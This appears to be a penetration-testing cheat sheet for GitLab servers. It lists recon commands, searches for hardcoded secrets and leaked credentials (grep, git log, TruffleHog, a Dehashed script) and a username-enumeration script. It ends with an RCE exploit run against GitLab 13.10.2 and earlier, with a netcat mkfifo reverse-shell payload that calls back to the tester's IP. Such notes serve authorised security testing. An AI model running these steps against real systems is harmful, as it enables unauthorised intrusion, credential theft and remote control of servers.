
- Login Page: `http://gitlab.<target>/users/sign_in`
- Version Check: `curl -s http://gitlab.<target>/help | grep -oP 'GitLab \K[\d.]+'`
- Search for hardcoded credentials, API keys, or SSH keys in commits.
- Try registering with common usernames `admin`, `root`, `gitlab`
- Search for secrets `grep -r "password\|api_key\|secret" .`
- Always check /explore for public repos
- Search commits for secrets (git log -p)
- Find leaked creds (e.g., from Dehashed) `python3 dehashed.py -q <target_domain> -p`
- Combine with TruffleHog to scan repos for secrets! `trufflehog git http://gitlab.<target>/root/repo.git
`

#### Username Enumeration
```
./gitlab_userenum.sh --url http://gitlab.<target>:8081/ --userlist users.txt
```

### Exploitation (RCE in GitLab ≤ 13.10.2)
#### Prerequisites
- Valid credentials (or self-registration if allowed).
- Vulnerable version (≤ 13.10.2).
#### Use Exploit Script:
```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.<target>:8081 -u <user> -p <password> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <YOUR_IP> 8443 >/tmp/f'
```
